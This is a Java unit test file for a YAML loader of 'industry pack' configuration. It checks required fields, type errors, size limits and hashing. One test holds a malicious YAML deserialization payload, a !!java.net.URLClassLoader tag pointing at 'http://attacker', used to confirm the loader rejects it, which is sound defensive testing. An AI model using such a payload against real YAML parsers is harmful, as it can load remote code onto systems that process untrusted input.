package com.openlab.qualitos.industry.infrastructure;

import com.openlab.qualitos.industry.domain.model.IndustryPack;
import com.openlab.qualitos.industry.infrastructure.yaml.IndustryPackParseException;
import com.openlab.qualitos.industry.infrastructure.yaml.IndustryPackYamlLoader;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import java.io.InputStream;
import java.nio.charset.StandardCharsets;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

class IndustryPackYamlLoaderTest {

  private final IndustryPackYamlLoader loader = new IndustryPackYamlLoader();

  @Test
  @DisplayName("Loads the reference manufacturing pack with all expected sections")
  void loadsManufacturingPack() throws Exception {
    try (InputStream in = getClass().getResourceAsStream("/industry-packs/manufacturing.yaml")) {
      IndustryPack pack = loader.load(in);
      assertThat(pack.id()).isEqualTo("manufacturing");
      assertThat(pack.version()).isEqualTo("1.0.0");
      assertThat(pack.sectors()).contains("ISIC-C", "NACE-C");
      assertThat(pack.supportedNorms()).contains("iso-9001", "iatf-16949");
      assertThat(pack.kpis()).hasSizeGreaterThanOrEqualTo(10);
      assertThat(pack.ishikawaTemplates()).hasSizeGreaterThanOrEqualTo(10);
      assertThat(pack.pokaYokeLibrary()).hasSizeGreaterThanOrEqualTo(5);
      assertThat(pack.trainingPaths()).hasSize(3);
      assertThat(pack.documentsTemplates()).hasSizeGreaterThanOrEqualTo(4);
      assertThat(pack.sha256()).hasSize(64);
      assertThat(pack.publishedAt()).isNotNull();
    }
  }

  @Test
  @DisplayName("Rejects YAML containing !!java/ tag (deserialization gadget)")
  void rejectsJavaTag() {
    String malicious = """
        id: malicious
        version: 1.0.0
        name: Malicious
        evil: !!java.net.URLClassLoader [["http://attacker"]]
        """;
    assertThatThrownBy(() -> loader.load(malicious.getBytes(StandardCharsets.UTF_8)))
        .isInstanceOf(IndustryPackParseException.class)
        .hasMessageContaining("Forbidden YAML tag");
  }

  @Test
  @DisplayName("Rejects empty input")
  void rejectsEmpty() {
    assertThatThrownBy(() -> loader.load(new byte[0]))
        .isInstanceOf(IndustryPackParseException.class)
        .hasMessageContaining("Empty");
  }

  @Test
  @DisplayName("Rejects oversize input")
  void rejectsOversize() {
    byte[] huge = new byte[IndustryPackYamlLoader.MAX_BYTES + 1];
    // fill with valid YAML padding so SafeConstructor isn't even reached
    for (int i = 0; i < huge.length; i++) huge[i] = ' ';
    assertThatThrownBy(() -> loader.load(huge))
        .isInstanceOf(IndustryPackParseException.class)
        .hasMessageContaining("exceeds maximum");
  }

  @Test
  @DisplayName("Rejects YAML without required fields")
  void rejectsMissingId() {
    String bad = "version: 1.0.0\nname: bla\n";
    assertThatThrownBy(() -> loader.load(bad.getBytes(StandardCharsets.UTF_8)))
        .isInstanceOf(IndustryPackParseException.class)
        .hasMessageContaining("id");
  }

  @Test
  @DisplayName("SHA-256 of identical bytes is deterministic")
  void sha256Deterministic() {
    byte[] data = "id: a\nversion: 1\nname: b\n".getBytes(StandardCharsets.UTF_8);
    String h1 = loader.load(data).sha256();
    String h2 = loader.load(data).sha256();
    assertThat(h1).isEqualTo(h2).hasSize(64);
  }

  @Test
  @DisplayName("Rejects YAML where root is a list, not a mapping")
  void rejectsListRoot() {
    String list = "- one\n- two\n";
    assertThatThrownBy(() -> loader.load(list.getBytes(StandardCharsets.UTF_8)))
        .isInstanceOf(IndustryPackParseException.class)
        .hasMessageContaining("mapping");
  }

  @Test
  @DisplayName("Rejects duplicate keys (SnakeYAML LoaderOptions)")
  void rejectsDuplicateKeys() {
    String dup = "id: x\nversion: 1.0.0\nname: a\nid: y\n";
    assertThatThrownBy(() -> loader.load(dup.getBytes(StandardCharsets.UTF_8)))
        .isInstanceOf(Exception.class);
  }

  @Test
  @DisplayName("Rejects YAML where `sectors` is a scalar instead of a list (strList wrong-type)")
  void rejectsScalarInsteadOfList() {
    String bad = "id: x\nversion: 1.0.0\nname: a\nsectors: not-a-list\n";
    assertThatThrownBy(() -> loader.load(bad.getBytes(StandardCharsets.UTF_8)))
        .isInstanceOf(IndustryPackParseException.class)
        .hasMessageContaining("list of strings");
  }

  @Test
  @DisplayName("Rejects YAML where `glossary` is a scalar instead of a map (strMap wrong-type)")
  void rejectsScalarInsteadOfMap() {
    String bad = "id: x\nversion: 1.0.0\nname: a\nglossary: scalar\n";
    assertThatThrownBy(() -> loader.load(bad.getBytes(StandardCharsets.UTF_8)))
        .isInstanceOf(IndustryPackParseException.class)
        .hasMessageContaining("map of strings");
  }

  @Test
  @DisplayName("Rejects YAML where `kpis` is a scalar instead of a list (mapList wrong-type)")
  void rejectsScalarInsteadOfListOfMaps() {
    String bad = "id: x\nversion: 1.0.0\nname: a\nkpis: not-a-list\n";
    assertThatThrownBy(() -> loader.load(bad.getBytes(StandardCharsets.UTF_8)))
        .isInstanceOf(IndustryPackParseException.class)
        .hasMessageContaining("Expected list");
  }

  @Test
  @DisplayName("Rejects YAML where `kpis` is a list of scalars (mapList expects mappings)")
  void rejectsListOfScalarsForMapList() {
    String bad = "id: x\nversion: 1.0.0\nname: a\nkpis: [\"just-a-string\"]\n";
    assertThatThrownBy(() -> loader.load(bad.getBytes(StandardCharsets.UTF_8)))
        .isInstanceOf(IndustryPackParseException.class)
        .hasMessageContaining("mapping inside list");
  }

  @Test
  @DisplayName("InputStream overload reads bytes and parses identically")
  void loadsFromInputStream() throws Exception {
    String yaml = "id: io\nversion: 1.0.0\nname: I/O\n";
    try (InputStream in = new java.io.ByteArrayInputStream(yaml.getBytes(StandardCharsets.UTF_8))) {
      IndustryPack p = loader.load(in);
      assertThat(p.id()).isEqualTo("io");
      assertThat(p.version()).isEqualTo("1.0.0");
      assertThat(p.sha256()).hasSize(64);
    }
  }

  @Test
  @DisplayName("Accepts explicit published_at and parses it as an Instant")
  void parsesExplicitPublishedAt() {
    String yaml = "id: ts\nversion: 1.0.0\nname: TS\npublished_at: 2025-01-15T10:30:00Z\n";
    IndustryPack p = loader.load(yaml.getBytes(StandardCharsets.UTF_8));
    assertThat(p.publishedAt()).isEqualTo(java.time.Instant.parse("2025-01-15T10:30:00Z"));
  }
}
